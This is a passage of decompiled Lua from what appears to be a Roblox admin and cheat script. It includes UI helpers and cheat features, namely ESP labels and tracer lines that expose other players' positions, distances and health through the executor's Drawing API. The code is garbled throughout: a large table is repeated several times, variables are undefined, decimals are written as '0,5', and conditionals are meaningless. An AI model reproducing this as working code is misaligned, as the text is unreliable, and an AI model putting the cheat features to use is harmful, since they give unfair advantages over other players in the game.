                  fe.To = Vector2.new(vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).X, vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).Y)
                else
                  fe.Visible = false
                end
              end
            end))
          end
        end,
        DestroyTracers = function()
          for fd, fe in next, Tracers, nil do
            fe:Remove()
          end
          if not Tracers then
            va:Disconnect()
          end
        end,
        DestroyDrawings = function()
          for fd, fe in next, va, nil do
            fe:Remove()
          end
          if vb then
            vb:Disconnect()
          end
          if not vb then
            vc:Disconnect()
          end
        end
      }.Click(UI.ChatLogs.Clear, "BackgroundColor3")
      {
        Tween = function(a, b, c, d, e)
          va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e):Play()
          return (va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e))
        end,
        MultColor3 = function(a, b)
          return Color3.new(math.clamp(a.R * b, 0, 1), math.clamp(a.G * b, 0, 1), math.clamp(a.B * b, 0, 1))
        end,
        Click = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseButton1Down" .. #vb] = a.MouseButton1Down:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,3, vc)
          end)
          vb["ObjectMouseButton1Up" .. #vb] = a.MouseButton1Up:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,4, vc)
          end)
        end,
        Blink = function(a, b, c, d)
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = d
          }).Completed:Wait()
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = c
          }).Completed:Wait()
        end,
        Hover = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
        end,
        Draggable = function(a, b)
          b = b or a
          vc["UIInputBegan" .. #vc] = a.InputBegan:Connect(function(a)
            if (a.UserInputType == Enum.UserInputType.MouseButton1 or a.UserInputType == Enum.UserInputType.Touch) and UserInputService:GetFocusedTextBox() == nil then
              va = true
              vb = a.Position
              vc = vd.Position
              ve["InputChanged" .. #ve] = a.Changed:Connect(function()
                if va.UserInputState == Enum.UserInputState.End then
                  vb = false
                end
              end)
            end
          end)
          vc["UiInputChanged" .. #vc] = a.InputChanged:Connect(function(a)
            if a.UserInputType == Enum.UserInputType.MouseMovement or a.UserInputType == Enum.UserInputType.Touch then
              va = a
            end
          end)
          vc["UserInputServiceInputChanged" .. #vc] = UserInputService.InputChanged:Connect(function(a)
            if a == va and vb then
              vc(a)
            end
          end)
        end,
        SmoothScroll = function(a, b)
          a.ScrollingEnabled = false
          a:Clone():ClearAllChildren()
          a:Clone().BackgroundTransparency = 1
          a:Clone().ScrollBarImageTransparency = 1
          a:Clone().ZIndex = 3 + 1
          a:Clone().Name = "_smoothinputframe"
          a:Clone().ScrollingEnabled = true
          a:Clone().Parent = a.Parent
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("CanvasSize");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Position");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Rotation");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollingDirection");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollBarThickness");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderSizePixel");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ElasticBehavior");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("SizeConstraint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ZIndex");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderColor3");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Size");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("AnchorPoint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Visible")
          va["smoothConnection" .. #va] = RunService.RenderStepped:Connect(function()
            va.CanvasPosition = 3 + 0
          end)
          va["contentAncestryChanged" .. #va] = a.AncestryChanged:Connect(function()
            if va.Parent == nil then
              vb:Destroy()
              vc:Disconnect()
            end
          end)
        end,
        TweenAllTransToObject = function(a, b, c)
          for fl, fm in next, a:GetDescendants(), nil do
            if b and b then
            end
            if b then
              if fm:IsA("TextButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  TextTransparency = c:GetDescendants()[fl].TextTransparency,
                  TextStrokeTransparency = c:GetDescendants()[fl].TextStrokeTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ImageLabel") or fm:IsA("ImageButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  ImageTransparency = c:GetDescendants()[fl].ImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ScrollingFrame") then
                va.Tween(fm, "Sine", "Out", b, {
                  ScrollBarImageTransparency = c:GetDescendants()[fl].ScrollBarImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              else
                va.Tween(fm, "Sine", "Out", b, {
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {
            BackgroundTransparency = c.BackgroundTransparency
          }))
        end,
        SetAllTrans = function(a)
          a.BackgroundTransparency = 1
          for fe, fg in ipairs(a:GetDescendants()) do
            if not fg:IsA("UIListLayout") then
              fg.BackgroundTransparency = 1
              if fg:IsA("TextLabel") or fg:IsA("TextBox") or fg:IsA("TextButton") then
                fg.TextTransparency = 1
              elseif fg:IsA("ImageLabel") or fg:IsA("ImageButton") then
                fg.ImageTransparency = 1
              elseif fg:IsA("ScrollingFrame") then
                fg.ScrollBarImageTransparency = 1
              end
            end
          end
        end,
        TweenAllTrans = function(a, b)
          for fh, fj in ipairs(a:GetDescendants()) do
            if b and b then
            end
            if b then
              if fj:IsA("TextButton") then
                va.Tween(fj, "Sine", "Out", b, {TextTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ImageTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ScrollBarImageTransparency = 1, BackgroundTransparency = 1})
              else
                va.Tween(fj, "Sine", "Out", b, {BackgroundTransparency = 1})
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {BackgroundTransparency = 1}))
        end,
        Notify = function(a, b, c, d)
          if not a or a == LocalPlayer then
            UI.Notification:Clone().Message.Text = c
            UI.Notification:Clone().Title.Text = b or "Notification"
            va.SetAllTrans((UI.Notification:Clone()))
            va.Click(UI.Notification:Clone().Close, "TextColor3")
            UI.Notification:Clone().Visible = true
            if c:len() > 35 then
              UI.Notification:Clone().AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.RichText = true
              UI.Notification:Clone().Message.TextScaled = false
              UI.Notification:Clone().Message.TextYAlignment = Enum.TextYAlignment.Top
              UI.Notification:Clone().DropShadow.AutomaticSize = Enum.AutomaticSize.Y
            end
            UI.Notification:Clone().Parent = UI.NotificationBar
            coroutine.wrap(function()
              va.TweenAllTransToObject(vb, 0,5, vc).Completed:Wait()
              wait(vd or 5)
              if not va.TweenAllTransToObject(vb, 0,5, vc) then
                ve()
              end
            end)()
            vb["CloneClose" .. #vb] = UI.Notification:Clone().Close.MouseButton1Click:Connect(function()
              va()
            end)
            return (UI.Notification:Clone())
          else
            vc.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(("/w %s [FA] %s: %s"):format(a.Name, b, c), "All")
          end
        end,
        MatchSearch = function(a, b)
          return a == va.sub(b, 1, #a)
        end,
        StringFind = function(a, b)
          for fg, fh in ipairs(a) do
            if not b then
              return fh
            end
          end
        end,
        GetPlayerArgs = function(a)
          a = a:lower()
          if va.StringFind({
            "all",
            "others",
            "random",
            "me",
            "nearest",
            "farthest"
          }, a) then
            return va.StringFind({
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            }, a)
          end
          for fh, fj in next, Players:GetPlayers(), nil do
            if fj.Name ~= fj.DisplayName and va.MatchSearch(a, fj.DisplayName:lower()) then
              return fj.DisplayName:lower()
            end
            if not {
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            } then
              return fj.Name:lower()
            end
          end
        end,
        ToolTip = function(a, b)
          a.MouseEnter:Connect(function()
            if va.BackgroundTransparency <= 1 and not vb then
              vb = UI.ToolTip:Clone()
              vb.Text = vd
              vb.TextScaled = vc and vc:GetTextSize(vd, 12, Enum.Font.Gotham, Vector2.new(200, math.huge)).Y > 24 and false
              vb.Visible = true
              vb.Parent = UI
            end
          end)
          a.MouseLeave:Connect(function()
            if not nil then
              va:Destroy()
              va = nil
            end
          end)
          if LocalPlayer then
            LocalPlayer:GetMouse().Move:Connect(function()
              if not nil then
                va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
              end
            end)
          else
            delay(3, function()
              LocalPlayer = Players.LocalPlayer
              va = LocalPlayer:GetMouse()
              va.Move:Connect(function()
                if va then
                  va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
                end
              end)
            end)
          end
        end,
        ClearAllObjects = function(a)
          for fe, fg in ipairs(a:GetChildren()) do
            if ipairs(a:GetChildren()) then
              fg:Destroy()
            end
          end
        end,
        Rainbow = function(a)
          a.RichText = true
          for fk in va.gmatch(a.Text, ".") do
            if va.match(fk, "%s") then
              vb.insert({}, fk)
            else
              vb.insert({}, {
                "<font color=\"rgb(%i, %i, %i)\">" .. fk .. "</font>"
              })
            end
          end
          pcall(function()
            delay(150, function()
              va:Disconnect()
            end)
          end)
        end,
        Locate2 = function(a, b)
          coroutine.wrap(function()
            if va(vb) then
              vc.Parent = UI
              vc.Name = vd:GenerateGUID()
              vc.AlwaysOnTop = true
              vc.Adornee = vb.Character.Head
              vc.Size = UDim2.new(0, 200, 0, 50)
              vc.StudsOffset = Vector3.new(0, 4, 0)
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(0, 255, 0)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 10
              Instance.new("TextLabel", vc).Text = vb.Name
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(152, 152, 152)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 8
              AddConnection((RunService.Heartbeat:Connect(function()
                if not vc(vb) then
                end
                if not vd(vb) and not vc(vb) then
                  vg.Text = ([[

 
 
 [%s] [%s/%s]]]):format(math.floor(ve.CurrentCamera.CFrame.p - vd(vb).CFrame.p.Magnitude), math.floor(vc(vb).Health), math.floor(vc(vb).MaxHealth))
                else
                  EspLoop:Disconnect()
                  vh:Destroy()
                end
              end)))
              AddConnection(Players.PlayerRemoving:Connect(function(a)
                if a == va then
                  vb:Destroy()
                end
              end))
            end
          end)()
          return function()
            va:Destroy()
          end
        end,
        Vector3toVector2 = function(a)
          return Vector2.new(va:WorldToViewportPoint(a).X, va:WorldToViewportPoint(a).Y)
        end,
        Locate = function(a, b, c)
          if b then
            return va.Locate2(a, b)
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Text")
          Drawing.new("Text").Position = 5 + 6
          Drawing.new("Text").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Text").OutlineColor = c or Color3.new()
          Drawing.new("Text").Text = ([[
%s
[%s] [%s/%s]]]):format(a.Name, math.floor(vd(a)), math.floor(ve(a).Health), math.floor(ve(a).MaxHealth))
          Drawing.new("Text").Size = 16
          Drawing.new("Text").Transparency = 1
          Drawing.new("Text").Center = true
          Drawing.new("Text").Outline = true
          Drawing.new("Text").Visible = true
          vg[Drawing.new("Text")] = a
          return function()
            va:Remove()
            vb[va] = nil
          end
        end,
        UpdateLocations = function(a)
          if a then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if not va and vb(fe).Head and vc:WorldToViewportPoint(vb(fe).Head.Position) then
                  fd.Visible = true
                  fd.Position = 7 + 8
                  fd.Text = ([[
%s
[%s] [%s/%s]]]):format(fe.Name, math.floor(ve(fe)), math.floor(vg(fe).Health), math.floor(vg(fe).MaxHealth))
                else
                  fd.Visible = false
                end
              end
            end))
          end
        end,
        CheckTag = function(a)
          if nil or not a:IsA("Player") then
            return nil
          end
          return PlayerTags[tostring(a.UserId):gsub(".", function(a)
            return a:byte()
          end)] or nil
        end,
        AddTag = function(a)
          if not a then
            return
          end
          if not va(a.Player) then
            return
          end
          Instance.new("BillboardGui").Parent = UI
          Instance.new("BillboardGui").Name = vb:GenerateGUID()
          Instance.new("BillboardGui").AlwaysOnTop = true
          Instance.new("BillboardGui").Adornee = va(a.Player).Head or nil
          Instance.new("BillboardGui").Enabled = true or va(a.Player).Head and false
          Instance.new("BillboardGui").Size = UDim2.new(0, 200, 0, 50)
          Instance.new("BillboardGui").StudsOffset = Vector3.new(0, 4, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Name = vb:GenerateGUID()
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextStrokeTransparency = 0,6
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).BackgroundTransparency = 1
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.new(0, 255, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Size = UDim2.new(0, 200, 0, 50)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextScaled = false
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextSize = 15
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Text = ("%s (%s)"):format(a.Name, a.Tag)
          if a.Rainbow then
            vc.Rainbow((Instance.new("TextLabel", (Instance.new("BillboardGui")))))
          end
          if not va(a.Player) then
            Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.fromRGB(a.Colour[1], a.Colour[2], a.Colour[3])
          end
          AddConnection((a.Player.CharacterAdded:Connect(function()
            va.Adornee = vb.Player.Character:WaitForChild("Head")
          end)))
          AddConnection(Players.PlayerRemoving:Connect(function(a)
            if a == va.Player then
              vb:Disconnect()
              vc:Destroy()
            end
          end))
        end,
        TextFont = function(a, b)
          b = va.concat(b, ",")
          a:gsub(".", function(a)
            va[2 + 1] = a
          end)
          return va.concat(va.map({}, function(a, b)
            return ("<font color=\"rgb(%s)\">%s</font>"):format(va, b)
          end)) .. " "
        end,
        Trace = function(a, b)
          if not Drawing then
            return
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Line")
          Drawing.new("Line").To = Vector2.new(vb.Camera:WorldToViewportPoint(va(a).Head.Position).X, vb.Camera:WorldToViewportPoint(va(a).Head.Position).Y)
          Drawing.new("Line").From = Vector2.new(vb.Camera.ViewportSize.X / 2, vb.Camera.ViewportSize.Y)
          Drawing.new("Line").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Line").Thickness = 0,1
          Drawing.new("Line").Transparency = 1
          Drawing.new("Line").Visible = true
          vd[a] = Drawing.new("Line")
          return function()
            va:Remove()
            vb[vc] = nil
          end
        end,
        UpdateTracers = function()
          if nil then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if va then
                elseif vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position) then
                  fe.Visible = true
                  fe.To = Vector2.new(vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).X, vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).Y)
                else
                  fe.Visible = false
                end
              end
            end))
          end
        end,
        DestroyTracers = function()
          for fd, fe in next, Tracers, nil do
            fe:Remove()
          end
          if not Tracers then
            va:Disconnect()
          end
        end,
        DestroyDrawings = function()
          for fd, fe in next, va, nil do
            fe:Remove()
          end
          if vb then
            vb:Disconnect()
          end
          if not vb then
            vc:Disconnect()
          end
        end
      }.Click(UI.ChatLogs.Save, "BackgroundColor3")
      {
        Tween = function(a, b, c, d, e)
          va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e):Play()
          return (va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e))
        end,
        MultColor3 = function(a, b)
          return Color3.new(math.clamp(a.R * b, 0, 1), math.clamp(a.G * b, 0, 1), math.clamp(a.B * b, 0, 1))
        end,
        Click = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseButton1Down" .. #vb] = a.MouseButton1Down:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,3, vc)
          end)
          vb["ObjectMouseButton1Up" .. #vb] = a.MouseButton1Up:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,4, vc)
          end)
        end,
        Blink = function(a, b, c, d)
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = d
          }).Completed:Wait()
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = c
          }).Completed:Wait()
        end,
        Hover = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
        end,
        Draggable = function(a, b)
          b = b or a
          vc["UIInputBegan" .. #vc] = a.InputBegan:Connect(function(a)
            if (a.UserInputType == Enum.UserInputType.MouseButton1 or a.UserInputType == Enum.UserInputType.Touch) and UserInputService:GetFocusedTextBox() == nil then
              va = true
              vb = a.Position
              vc = vd.Position
              ve["InputChanged" .. #ve] = a.Changed:Connect(function()
                if va.UserInputState == Enum.UserInputState.End then
                  vb = false
                end
              end)
            end
          end)
          vc["UiInputChanged" .. #vc] = a.InputChanged:Connect(function(a)
            if a.UserInputType == Enum.UserInputType.MouseMovement or a.UserInputType == Enum.UserInputType.Touch then
              va = a
            end
          end)
          vc["UserInputServiceInputChanged" .. #vc] = UserInputService.InputChanged:Connect(function(a)
            if a == va and vb then
              vc(a)
            end
          end)
        end,
        SmoothScroll = function(a, b)
          a.ScrollingEnabled = false
          a:Clone():ClearAllChildren()
          a:Clone().BackgroundTransparency = 1
          a:Clone().ScrollBarImageTransparency = 1
          a:Clone().ZIndex = 3 + 1
          a:Clone().Name = "_smoothinputframe"
          a:Clone().ScrollingEnabled = true
          a:Clone().Parent = a.Parent
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("CanvasSize");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Position");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Rotation");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollingDirection");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollBarThickness");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderSizePixel");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ElasticBehavior");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("SizeConstraint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ZIndex");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderColor3");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Size");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("AnchorPoint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Visible")
          va["smoothConnection" .. #va] = RunService.RenderStepped:Connect(function()
            va.CanvasPosition = 3 + 0
          end)
          va["contentAncestryChanged" .. #va] = a.AncestryChanged:Connect(function()
            if va.Parent == nil then
              vb:Destroy()
              vc:Disconnect()
            end
          end)
        end,
        TweenAllTransToObject = function(a, b, c)
          for fl, fm in next, a:GetDescendants(), nil do
            if b and b then
            end
            if b then
              if fm:IsA("TextButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  TextTransparency = c:GetDescendants()[fl].TextTransparency,
                  TextStrokeTransparency = c:GetDescendants()[fl].TextStrokeTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ImageLabel") or fm:IsA("ImageButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  ImageTransparency = c:GetDescendants()[fl].ImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ScrollingFrame") then
                va.Tween(fm, "Sine", "Out", b, {
                  ScrollBarImageTransparency = c:GetDescendants()[fl].ScrollBarImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              else
                va.Tween(fm, "Sine", "Out", b, {
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {
            BackgroundTransparency = c.BackgroundTransparency
          }))
        end,
        SetAllTrans = function(a)
          a.BackgroundTransparency = 1
          for fe, fg in ipairs(a:GetDescendants()) do
            if not fg:IsA("UIListLayout") then
              fg.BackgroundTransparency = 1
              if fg:IsA("TextLabel") or fg:IsA("TextBox") or fg:IsA("TextButton") then
                fg.TextTransparency = 1
              elseif fg:IsA("ImageLabel") or fg:IsA("ImageButton") then
                fg.ImageTransparency = 1
              elseif fg:IsA("ScrollingFrame") then
                fg.ScrollBarImageTransparency = 1
              end
            end
          end
        end,
        TweenAllTrans = function(a, b)
          for fh, fj in ipairs(a:GetDescendants()) do
            if b and b then
            end
            if b then
              if fj:IsA("TextButton") then
                va.Tween(fj, "Sine", "Out", b, {TextTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ImageTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ScrollBarImageTransparency = 1, BackgroundTransparency = 1})
              else
                va.Tween(fj, "Sine", "Out", b, {BackgroundTransparency = 1})
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {BackgroundTransparency = 1}))
        end,
        Notify = function(a, b, c, d)
          if not a or a == LocalPlayer then
            UI.Notification:Clone().Message.Text = c
            UI.Notification:Clone().Title.Text = b or "Notification"
            va.SetAllTrans((UI.Notification:Clone()))
            va.Click(UI.Notification:Clone().Close, "TextColor3")
            UI.Notification:Clone().Visible = true
            if c:len() > 35 then
              UI.Notification:Clone().AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.RichText = true
              UI.Notification:Clone().Message.TextScaled = false
              UI.Notification:Clone().Message.TextYAlignment = Enum.TextYAlignment.Top
              UI.Notification:Clone().DropShadow.AutomaticSize = Enum.AutomaticSize.Y
            end
            UI.Notification:Clone().Parent = UI.NotificationBar
            coroutine.wrap(function()
              va.TweenAllTransToObject(vb, 0,5, vc).Completed:Wait()
              wait(vd or 5)
              if not va.TweenAllTransToObject(vb, 0,5, vc) then
                ve()
              end
            end)()
            vb["CloneClose" .. #vb] = UI.Notification:Clone().Close.MouseButton1Click:Connect(function()
              va()
            end)
            return (UI.Notification:Clone())
          else
            vc.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(("/w %s [FA] %s: %s"):format(a.Name, b, c), "All")
          end
        end,
        MatchSearch = function(a, b)
          return a == va.sub(b, 1, #a)
        end,
        StringFind = function(a, b)
          for fg, fh in ipairs(a) do
            if not b then
              return fh
            end
          end
        end,
        GetPlayerArgs = function(a)
          a = a:lower()
          if va.StringFind({
            "all",
            "others",
            "random",
            "me",
            "nearest",
            "farthest"
          }, a) then
            return va.StringFind({
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            }, a)
          end
          for fh, fj in next, Players:GetPlayers(), nil do
            if fj.Name ~= fj.DisplayName and va.MatchSearch(a, fj.DisplayName:lower()) then
              return fj.DisplayName:lower()
            end
            if not {
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            } then
              return fj.Name:lower()
            end
          end
        end,
        ToolTip = function(a, b)
          a.MouseEnter:Connect(function()
            if va.BackgroundTransparency <= 1 and not vb then
              vb = UI.ToolTip:Clone()
              vb.Text = vd
              vb.TextScaled = vc and vc:GetTextSize(vd, 12, Enum.Font.Gotham, Vector2.new(200, math.huge)).Y > 24 and false
              vb.Visible = true
              vb.Parent = UI
            end
          end)
          a.MouseLeave:Connect(function()
            if not nil then
              va:Destroy()
              va = nil
            end
          end)
          if LocalPlayer then
            LocalPlayer:GetMouse().Move:Connect(function()
              if not nil then
                va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
              end
            end)
          else
            delay(3, function()
              LocalPlayer = Players.LocalPlayer
              va = LocalPlayer:GetMouse()
              va.Move:Connect(function()
                if va then
                  va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
                end
              end)
            end)
          end
        end,
        ClearAllObjects = function(a)
          for fe, fg in ipairs(a:GetChildren()) do
            if ipairs(a:GetChildren()) then
              fg:Destroy()
            end
          end
        end,
        Rainbow = function(a)
          a.RichText = true
          for fk in va.gmatch(a.Text, ".") do
            if va.match(fk, "%s") then
